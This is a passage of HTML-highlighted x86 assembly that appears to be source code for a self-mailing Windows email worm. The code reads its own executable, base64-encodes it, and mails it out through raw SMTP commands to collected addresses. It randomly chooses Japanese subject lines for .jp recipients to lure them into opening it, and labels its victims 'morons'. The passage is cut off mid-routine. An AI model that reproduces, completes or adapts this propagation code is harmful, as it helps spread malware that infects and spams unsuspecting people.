    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">0</span><span class="sc0">
    </span><span class="sc5">callW</span><span class="sc0">   </span><span class="sc5">GetModuleFileNameA</span><span class="sc0">

    </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc8">ebx</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ebx</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc5">FILE_ATTRIBUTE_NORMAL</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc5">OPEN_EXISTING</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ebx</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc5">FILE_SHARE_READ</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc5">GENERIC_READ</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc5">ofs</span><span class="sc0"> </span><span class="sc5">myfilename</span><span class="sc0">
    </span><span class="sc5">callW</span><span class="sc0">   </span><span class="sc5">CreateFileA</span><span class="sc0">
    </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">jz</span><span class="sc0">  </span><span class="sc5">@@error</span><span class="sc0">
    </span><span class="sc6">dec</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc5">dwo</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">hmyfile</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">

    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">0</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc5">dwo</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">hmyfile</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc5">callW</span><span class="sc0">   </span><span class="sc5">GetFileSize</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc5">dwo</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">fsize</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">

    </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">100h</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc5">GHND</span><span class="sc0">
    </span><span class="sc5">callW</span><span class="sc0">   </span><span class="sc5">GlobalAlloc</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc5">dwo</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">hmemout0</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">

    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc5">callW</span><span class="sc0">   </span><span class="sc5">GlobalLock</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc5">dwo</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">ptr_myself</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">

    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">0</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc5">ofs</span><span class="sc0"> </span><span class="sc5">recv_buffer</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc5">dwo</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">fsize</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc5">dwo</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">hmyfile</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc5">callW</span><span class="sc0">   </span><span class="sc5">ReadFile</span><span class="sc0">
    </span><span class="sc6">test</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">jz</span><span class="sc0">  </span><span class="sc5">@@eexit</span><span class="sc0">
    
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">0</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc5">dwo</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">hmyfile</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc5">callW</span><span class="sc0">   </span><span class="sc5">GetFileSize</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">         </span><span class="sc1">;  save size</span><span class="sc0">

    </span><span class="sc6">shl</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">1</span><span class="sc0">           </span><span class="sc1">;  eax*2</span><span class="sc0">
    
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc5">GHND</span><span class="sc0">
    </span><span class="sc5">callW</span><span class="sc0">   </span><span class="sc5">GlobalAlloc</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc5">dwo</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">hmemout</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">

    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc5">callW</span><span class="sc0">   </span><span class="sc5">GlobalLock</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc5">dwo</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">ptr_base64buf</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">

</span><span class="sc1">;   pop ebx         ;  restore size</span><span class="sc0">
</span><span class="sc1">;   push    ebx         ;  size</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc5">dwo</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">ptr_myself</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">base64encode</span><span class="sc0">


    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc5">dwo</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">hmyfile</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc5">callW</span><span class="sc0">   </span><span class="sc5">CloseHandle</span><span class="sc0">

    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc5">dwo</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">ptr_myself</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc5">callW</span><span class="sc0">   </span><span class="sc5">GlobalUnlock</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc5">dwo</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">hmemout0</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc5">callW</span><span class="sc0">   </span><span class="sc5">GlobalFree</span><span class="sc0">
    
    </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">ret</span><span class="sc0">

    </span><span class="sc5">@@eexit</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc5">dwo</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">hmyfile</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc5">callW</span><span class="sc0">   </span><span class="sc5">CloseHandle</span><span class="sc0">

    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc5">dwo</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">ptr_myself</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc5">callW</span><span class="sc0">   </span><span class="sc5">GlobalUnlock</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc5">dwo</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">hmemout0</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc5">callW</span><span class="sc0">   </span><span class="sc5">GlobalFree</span><span class="sc0">

    </span><span class="sc5">@@error</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">dec</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">ret</span><span class="sc0">
    
</span><span class="sc5">base64encode</span><span class="sc0">    </span><span class="sc9">proc</span><span class="sc0"> </span><span class="sc10">pascal</span><span class="sc0">
    </span><span class="sc5">arg</span><span class="sc0"> </span><span class="sc5">@@src</span><span class="sc0">
    </span><span class="sc5">arg</span><span class="sc0"> </span><span class="sc5">@@dest</span><span class="sc0">
    </span><span class="sc5">arg</span><span class="sc0"> </span><span class="sc5">@@srclen</span><span class="sc0">

    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc5">dwo</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">@@src</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc5">dwo</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">@@dest</span><span class="sc4">]</span><span class="sc0">

    </span><span class="sc5">@@b64loop</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc5">dwo</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">@@srclen</span><span class="sc4">],</span><span class="sc2">1</span><span class="sc0">
    </span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">@@srclen2</span><span class="sc0">
    </span><span class="sc6">lodsb</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">2</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc2">03D3Dh</span><span class="sc0">      </span><span class="sc1">;  ==</span><span class="sc0">
    </span><span class="sc6">dec</span><span class="sc0"> </span><span class="sc5">dwo</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">@@srclen</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">@@b64next</span><span class="sc0">

    </span><span class="sc5">@@srclen2</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc5">dwo</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">@@srclen</span><span class="sc4">],</span><span class="sc2">2</span><span class="sc0">
    </span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">@@srclen3</span><span class="sc0">
    </span><span class="sc6">lodsw</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">3</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">03dh</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">
    </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc5">dwo</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">@@srclen</span><span class="sc4">],</span><span class="sc2">2</span><span class="sc0">
    </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">@@b64next</span><span class="sc0">
    </span><span class="sc5">@@srclen3</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">lodsd</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">4</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
    </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc8">edx</span><span class="sc0">
    </span><span class="sc6">dec</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">
    </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc5">dwo</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">@@srclen</span><span class="sc4">],</span><span class="sc2">3</span><span class="sc0">

    </span><span class="sc5">@@b64next</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">bswap</span><span class="sc0">   </span><span class="sc8">eax</span><span class="sc0">
    
    </span><span class="sc5">@@b64n_loop</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">and</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">0FC000000h</span><span class="sc0">
    </span><span class="sc6">rol</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">6</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,[</span><span class="sc5">@@b64table</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">stosb</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">ebx</span><span class="sc0">
    </span><span class="sc6">shl</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">6</span><span class="sc0">
    </span><span class="sc6">dec</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
    </span><span class="sc6">jnz</span><span class="sc0"> </span><span class="sc5">@@b64n_loop</span><span class="sc0">

    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc5">dwo</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">@@srclen</span><span class="sc4">],</span><span class="sc2">0</span><span class="sc0">
    </span><span class="sc6">ja</span><span class="sc0">  </span><span class="sc5">@@b64loop</span><span class="sc0">

    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">edx</span><span class="sc0">
    </span><span class="sc6">stosd</span><span class="sc0">
    </span><span class="sc6">ret</span><span class="sc0">

    </span><span class="sc5">@@b64table</span><span class="sc0">  </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc3">"ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/"</span><span class="sc0">
    </span><span class="sc9">endp</span><span class="sc0">
    
    
</span><span class="sc5">g_send</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc1">;;  in</span><span class="sc0">
    </span><span class="sc1">;;   ecx = size</span><span class="sc0">
    </span><span class="sc1">;;   esi = ptr to data</span><span class="sc0">
    </span><span class="sc1">;;  out</span><span class="sc0">
    </span><span class="sc1">;;   eax = ret value of send()</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">0</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ecx</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">esi</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc5">dwo</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">sock</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc5">callW</span><span class="sc0">   </span><span class="sc5">send</span><span class="sc0">
    </span><span class="sc6">ret</span><span class="sc0">
    
</span><span class="sc5">g_recv</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc1">;;  out</span><span class="sc0">
    </span><span class="sc1">;;   error -&gt; eax=-1  success -&gt; eax = 0</span><span class="sc0">
    </span><span class="sc5">@@again</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">0</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">1024</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc5">ofs</span><span class="sc0"> </span><span class="sc5">recv_buffer</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc5">dwo</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">sock</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc5">callW</span><span class="sc0">   </span><span class="sc5">recv</span><span class="sc0">
    </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">jz</span><span class="sc0">  </span><span class="sc5">@@recv_error</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">1024</span><span class="sc0">
    </span><span class="sc6">jz</span><span class="sc0">  </span><span class="sc5">@@again</span><span class="sc0">
    </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">ret</span><span class="sc0">
    </span><span class="sc5">@@recv_error</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">dec</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">ret</span><span class="sc0">

    
</span><span class="sc5">sendmail</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc1">;;  yea. lame routine ;)</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">esi</span><span class="sc0">         </span><span class="sc1">;  mail addr</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc5">dwo</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">jflag</span><span class="sc4">],</span><span class="sc2">0</span><span class="sc0">       </span><span class="sc1">;  flag for .jp</span><span class="sc0">
    </span><span class="sc1">;;  </span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">g_recv</span><span class="sc0">

    </span><span class="sc1">;;  </span><span class="sc0">
    </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc5">smtp_HELO</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc5">len_smtp_HELO</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">g_send</span><span class="sc0">

    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">g_recv</span><span class="sc0">

    </span><span class="sc1">;;  </span><span class="sc0">
    </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc5">smtp_MAIL_FROM</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc5">len_smtp_MAIL_FROM</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">g_send</span><span class="sc0">

    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc5">ofs</span><span class="sc0"> </span><span class="sc5">morons_Mailaddr</span><span class="sc0">
    </span><span class="sc5">callW</span><span class="sc0">   </span><span class="sc5">lstrlen</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc5">morons_Mailaddr</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">g_send</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc2">2</span><span class="sc0">
    </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc5">smtp_crlf</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">g_send</span><span class="sc0">

    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">g_recv</span><span class="sc0">
    </span><span class="sc1">;;  </span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc5">len_smtp_RCPT_TO</span><span class="sc0">
    </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc5">smtp_RCPT_TO</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">g_send</span><span class="sc0">

    </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">esi</span><span class="sc0">

    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">esi</span><span class="sc0">
    </span><span class="sc5">callW</span><span class="sc0">   </span><span class="sc5">lstrlen</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">         </span><span class="sc1">;  save</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">g_send</span><span class="sc0">
    
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc2">2</span><span class="sc0">
    </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc5">smtp_crlf</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">g_send</span><span class="sc0">

    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">g_recv</span><span class="sc0">

    </span><span class="sc1">;;  .jp?</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">         </span><span class="sc1">;  len of mail address</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">esi</span><span class="sc0">         </span><span class="sc1">;  mail address</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc2">3</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc5">dwo</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">],</span><span class="sc2">00706a2eh</span><span class="sc0"> </span><span class="sc1">;  .jp?</span><span class="sc0">
    </span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">@@1</span><span class="sc0">
    </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc5">dwo</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">jflag</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc5">@@1</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc1">;;</span><span class="sc0">

    </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc5">smtp_DATA</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc5">len_smtp_DATA</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">g_send</span><span class="sc0">

    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">g_recv</span><span class="sc0">
    </span><span class="sc1">;;</span><span class="sc0">

    </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc5">smtp_BODY_FROM</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc5">len_smtp_BODY_FROM</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">g_send</span><span class="sc0">

    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc5">ofs</span><span class="sc0"> </span><span class="sc5">morons_Mailaddr</span><span class="sc0">
    </span><span class="sc5">callW</span><span class="sc0">   </span><span class="sc5">lstrlen</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc5">morons_Mailaddr</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">g_send</span><span class="sc0">

    </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc5">smtp_BODY_TO</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc5">len_smtp_BODY_TO</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">g_send</span><span class="sc0">

    </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">esi</span><span class="sc0">
    
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">esi</span><span class="sc0">
    </span><span class="sc5">callW</span><span class="sc0">   </span><span class="sc5">lstrlen</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">g_send</span><span class="sc0">

    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc5">dwo</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">jflag</span><span class="sc4">],</span><span class="sc2">0</span><span class="sc0">
    </span><span class="sc6">jnz</span><span class="sc0"> </span><span class="sc5">@@jsubject</span><span class="sc0">
    
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc5">len_smtp_BODY_SUBJECT</span><span class="sc0">
    </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc5">smtp_BODY_SUBJECT</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">g_send</span><span class="sc0">
    </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">@@body</span><span class="sc0">

    </span><span class="sc5">@@jsubject</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc1">;;  gen subject</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc5">len_smtp_jsubject_1</span><span class="sc0">
    </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc5">smtp_jsubject_1</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">g_send</span><span class="sc0">

    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,(</span><span class="sc5">num_of_jsub</span><span class="sc4">-</span><span class="sc2">1</span><span class="sc4">)</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">rng</span><span class="sc0">
    </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc5">japanese_subjects</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc5">dwo</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc8">eax</span><span class="sc4">*</span><span class="sc2">4</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">esi</span><span class="sc0">
    </span><span class="sc5">callW</span><span class="sc0">   </span><span class="sc5">lstrlen</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">g_send</span><span class="sc0">

    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc5">len_smtp_jsubject_2</span><span class="sc0">
    </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc5">smtp_jsubject_2</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">g_send</span><span class="sc0">



    </span><span class="sc5">@@body</span><span class="sc4">:</span><span class="sc0">
